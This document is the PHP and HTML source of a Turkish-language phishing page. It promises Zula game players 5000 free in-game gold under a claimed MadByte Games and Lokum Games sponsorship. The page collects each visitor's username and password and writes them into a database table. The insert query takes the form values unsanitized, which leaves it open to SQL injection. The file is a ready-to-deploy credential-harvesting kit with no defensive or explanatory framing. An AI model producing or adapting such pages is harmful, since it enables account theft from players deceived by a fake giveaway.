<?php 
		error_reporting(0);
		include ("ayar.php");
      
        if($_POST){
        
           
            $kad        =    $_POST["kad"];
            $kfre    =    $_POST["kfre"];
            
            
            $ekle        =    mysql_query("insert into zula (kad,kfre) values ('$kad','$kfre')");
            
           
            if($ekle){
                header ("Location:basarili.html"); 
            }else{
                echo "Bir Sorun Oluştu";
            }
        }
?>
 
<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<link rel="stylesheet" href="style.css"/>
	<title>Zula Ücretsiz ZA Kazan!</title>
</head>
<body background="resim/bg.jpg">
	<form action="" method="post">
		<input name="kad" type="text" placeholder="Kullanıcı Adı" style="position:absolute;width:215px;height:30px;left:574px;top:100px;z-index:6">
		<input name="kfre" type="password" placeholder="Şifre" style="position:absolute;width:215px;height:30px;left:574px;top:150px;z-index:6">
		<input type="image" value="submit" src="./buton.png" style="position:absolute;width:215px;height:30px;left:574px;top:200px;z-index:6"/>
	</form>
	
	<div class="yazi">MadByte Games ve Lokum Games sponsorluğunda kurduğumuz sitemizi her hesap yalnızca 1 kez kullanabilir ve her hesaba 5000 zula altını (ZA) yüklenebilmektedir.</div>
	<div class="footer-lokum-logo">
	<img src="lokum.png"/>
	</div>
	
	<div class="footer-madbyte">
	<img src="madbyte.jpg"/>
	</div>
	
</body>
</html>